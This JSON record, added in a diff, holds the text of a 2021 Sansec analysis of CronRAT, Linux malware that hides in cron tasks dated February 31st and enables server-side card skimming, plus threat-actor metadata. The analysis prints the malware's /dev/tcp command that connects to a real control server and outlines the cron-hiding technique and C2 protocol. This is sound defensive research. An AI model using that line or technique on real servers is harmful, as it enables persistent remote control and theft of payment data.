@@ -1,0 +1,116 @@
+{
+    "id": "c47af61f-4f05-4d4e-9a34-37d57292cab9",
+    "created_at": "2023-01-12T15:06:05.791616Z",
+    "updated_at": "2025-03-27T02:14:34.1233Z",
+    "deleted_at": null,
+    "sha1_hash": "bd01bb4be480a9e35f0a0912e497ec006daf6e05",
+    "title": "2021-11-24 - CronRAT malware hides behind February 31st",
+    "authors": "",
+    "file_creation_date": "2022-05-28T23:18:11Z",
+    "file_modification_date": "2022-05-28T23:18:11Z",
+    "file_size": 1255627,
+    "plain_text": "# CronRAT malware hides behind February 31st\n\n**sansec.io/research/cronrat**\n\n24th November 2021\n\n[Web Skimming / Sansec Threat Research](https://sansec.io/research)\nLearn about new eCommerce hacks?\n\n\nNovember 24, 2021\n\n\nReceive an alert whenever we discover new hacks or vulnerabilities that may affect\nyour online store.\n\nWhat is\n\nMagecart?\n\nAlso known as digital skimming, this crime has surged since 2015. Criminals steal\ncard data during online shopping. Who are behind these notorious hacks, how does it\nwork, and how have Magecart attacks evolved over time?\n\n[About Magecart](https://sansec.io/what-is-magecart)\n\n**In the run-up to Black Friday, Sansec discovered a sophisticated threat that is packed**\n**with never-seen stealth techniques. This malware, dubbed “CronRAT”, hides in the**\n**Linux calendar system on February 31st. It is not recognized by other security**\n**vendors and is likely to stay undetected on critical infrastructure for the coming**\n**months. CronRAT enables server-side Magecart data theft which bypasses browser-**\n**based security solutions.**\n\n\n-----\n\nAt this time of year we typically see a surge in eCommerce attacks and new malware. Last\n[week we analyzed a clever malware attacking online stores, and today we expose another,](https://sansec.io/research/ecommerce-malware-linux-avp)\nmuch more sophisticated threat. It is a Remote Access Trojan (RAT) and we have named it\nCronRAT.\n\nSansec found CronRAT to be present on multiple online stores, among them a nation’s\n[largest outlet. Because of its novel execution, we had to rewrite part of our eComscan](https://sansec.io/ecomscan)\nalgorithm in order to detect it. CronRAT is currently [undetected by other security vendors.](https://www.virustotal.com/gui/file/b46e51a2e757f4d75f1a1fff1165c6a0503b687db6c7e672021dcaa9bedf2d88/detection)\n\nCronRAT’s main feat is hiding in the calendar subsystem of Linux servers (“cron”) on a\nnonexistant day. This way, it will not attract attention from server administrators. And many\nsecurity products do not scan the Linux cron system.\n\nCronRAT facilitates persistent control over an eCommerce server. Sansec has studied\nseveral cases where the presence of CronRAT lead to the injection of payment skimmers\n(aka [Magecart) in server-side code.](https://sansec.io/what-is-magecart)\n\nSansec director of threat research Willem de Groot observes:\n\nDigital skimming is moving from the browser to the server and this is yet another\nexample. Most online stores have only implemented browser-based defenses, and\ncriminals capitalize on the unprotected back-end. Security professionals should really\nconsider the full attack surface.\n\nCronRAT’s stealth capabilities pose a serious threat to Linux eCommerce servers:\n\nFileless execution\nTiming modulation\nAnti-tampering checksums\nControlled via binary, obfuscated protocol\nLaunches tandem RAT in separate Linux subsystem\nControl server disguised as “Dropbear SSH” service\nPayload hidden in legitimate CRON scheduled task names\n\n## Technical analysis\n\n\n-----\n\nThe CronRAT adds a number of tasks to crontab with a curious date specification: `52 23`\n```\n31 2 3 . These lines are syntactically valid, but would generate a run time error when\n\n```\nexecuted. However, this will never happen as they are scheduled to run on February 31st.\nInstead, the actual malware code is hidden in the task names and is constructed using\nseveral layers of compression and base64 decoding.\n\n[The actual payload (see raw and](https://gist.github.com/gwillem/fbe3e6b98e2e10d7f1f271ca4b6e813f) [annotated copy) is a sophisticated Bash program that](https://gist.github.com/gwillem/fbe3e6b98e2e10d7f1f271ca4b6e813f#file-cronrat-annotated-sh)\nfeatures self-destruction, timing modulation and a custom binary protocol to communicate\nwith a foreign control server. As one security engineer remarks:\n\nI thought I had mastered bash, but that script is giving me a headache😅\n\n[— アルミ (@schrotthaufen) November 25, 2021](https://twitter.com/schrotthaufen/status/1463977342666170372?ref_src=twsrc%5Etfw)\n\nUpon launch, it contacts the control server using an uncommon method for TCP\ncommunication:\n```\neval \"exec 3<>/dev/tcp/796077735/$((0x1bb))\" &>/dev/null || exit_with_code 5\n\n```\n\n-----\n\nThis resolves to port `443 on` `47.115.46.167, an Alibaba hosted IP. This service`\ngenerates a banner for the Dropbear SSH service, which is commonly installed on\nembedded devices. However, this is clearly a disguise.\n\nCronRAT implements a custom binary protocol with random checksums, to avoid detection\nby firewalls and packet inspectors.\n\nOnce a connection with the C&C server is established, CronRAT takes these steps:\n\n1. Discards the fake `SSH-2.0-dropbear_2017.75 banner.`\n2. Sends a password, the `cio command and then (presumably) a host identifier.`\n3. Waits for a `sd (self-destruct) or` `ev (eval) command from the control server`\n4. Sends `prm command and password/identifier, then receives command parameters`\n\nfor the sidekick RAT\n5. Sends `dwn command and receives malicious dynamic library`\n6. Library is saved to one of these paths: `/dev/shm,` `/run/user/UID,` `/tmp,`\n\n\n-----\n\n8. Monitors custom command for 5 seconds and, depending on success, sends `ssc,`\n```\n   ser or sun command.\n\n```\n9. Finishes with `cex command.`\n\nThis essentially allows the RAT operator to run any code.\n\n## Coming up\n\nIn order to study the control server’s behavior, we wrote a specially crafted RAT client to\nintercept commands. And we tricked the C2 server into sending us yet another RAT, which\n[manages to embed itself in the Nginx web server process. Read about NginRAT.](https://sansec.io/research/nginrat)\n\n_[We greatly appreciate the help of Cipriano Groenendal at](https://nl.linkedin.com/in/ciprianogroenendal)_ _[Hypernode for providing malware](https://www.hypernode.com/)_\n_samples and valuable analysis._\n\n[data-size=\"large\" > Follow @sansecio](https://twitter.com/sansecio)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-24 - CronRAT malware hides behind February 31st.pdf"
+    ],
+    "report_names": [
+        "2021-11-24 - CronRAT malware hides behind February 31st.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
+            "created_at": "2023-01-06T13:46:38.814104Z",
+            "updated_at": "2025-03-27T02:00:02.925972Z",
+            "deleted_at": null,
+            "main_name": "MageCart",
+            "aliases": [],
+            "source_name": "MISPGALAXY:MageCart",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "3fff98c9-ad02-401d-9d4b-f78b5b634f31",
+            "created_at": "2023-01-06T13:46:38.376868Z",
+            "updated_at": "2025-03-27T02:00:02.818071Z",
+            "deleted_at": null,
+            "main_name": "Cleaver",
+            "aliases": [
+                "Cobalt Gypsy",
+                "G0003",
+                "Operation Cleaver",
+                "Op Cleaver",
+                "Tarh Andishan",
+                "Alibaba",
+                "TG-2889"
+            ],
+            "source_name": "MISPGALAXY:Cleaver",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535965,
+    "ts_updated_at": 1743041674,
+    "ts_creation_date": 1653779891,
+    "ts_modification_date": 1653779891,
+    "files": {
+        "pdf": "https://archive.orkl.eu/bd01bb4be480a9e35f0a0912e497ec006daf6e05.pdf",
+        "text": "https://archive.orkl.eu/bd01bb4be480a9e35f0a0912e497ec006daf6e05.txt",
+        "img": "https://archive.orkl.eu/bd01bb4be480a9e35f0a0912e497ec006daf6e05.jpg"
+    }
+}
